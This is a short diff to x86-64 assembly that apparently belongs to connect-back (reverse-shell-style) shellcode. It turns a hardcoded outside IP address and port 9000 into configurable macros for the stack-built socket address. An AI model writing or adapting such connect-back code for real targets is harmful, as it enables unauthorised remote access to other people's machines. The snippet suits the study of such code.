@@ -1,5 +1,12 @@
 [bits 64]
 
+%ifndef IPADDR
+    %define IPADDR 0xB7_D0_D1_86 ; 134.209.208.183 (digital ocean droplet)
+%endif
+%ifndef PORT
+    %define PORT 0x2823 ; 9000
+%endif
+
 global _start
 
 _start:
@@ -40,8 +47,8 @@ _start:
     sub rsp, 16 ; reserve 16 bytes for sockaddr_in
     mov word [rsp], 2 ; 2 bytes for AF_INET
     ; the hex below is written in little endian for 0x86 hex which is read as big endian
-    mov word [rsp+2], 0x2823 ; 2 bytes for port
-    mov dword [rsp+4], 0xB7_D0_D1_86 ; 4 bytes for ip addr
+    mov word [rsp+2], PORT ; 2 bytes for port
+    mov dword [rsp+4], IPADDR ; 4 bytes for ip addr
     ; 8 bytes after is padding
     mov rsi, rsp ; sockaddr_in = stack
     mov rdx, 16 ; socklen = 16
